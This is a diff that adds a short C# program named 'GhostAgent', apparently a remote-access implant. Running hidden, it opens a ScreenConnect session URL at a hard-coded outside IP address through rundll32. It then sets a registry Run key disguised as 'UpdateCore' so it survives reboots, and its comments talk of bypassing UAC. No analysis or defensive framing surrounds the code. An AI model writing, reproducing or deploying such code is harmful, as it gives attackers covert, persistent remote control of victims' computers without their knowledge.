@@ -1,0 +1,37 @@
+﻿using System;
+using System.Diagnostics;
+using System.Security.Principal;
+using System.Threading;
+
+namespace GhostAgent
+{
+    public class Program
+    {
+        [System.STAThread]
+        public static void Main()
+        {
+            // Bypass UAC check – run even if not admin
+            try
+            {
+                // Start ScreenConnect session via rundll32 (invisible)
+                Process.Start(new ProcessStartInfo()
+                {
+                    FileName = "rundll32.exe",
+                    Arguments = "url.dll,OpenURL http://104.238.60.143:8040/Session",
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true,
+                    UseShellExecute = false
+                });
+            }
+            catch { }
+
+            // Optional: Add persistence (survives reboot)
+            try
+            {
+                var key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                key.SetValue("UpdateCore", Environment.GetCommandLineArgs()[0]);
+            }
+            catch { }
+        }
+    }
+}
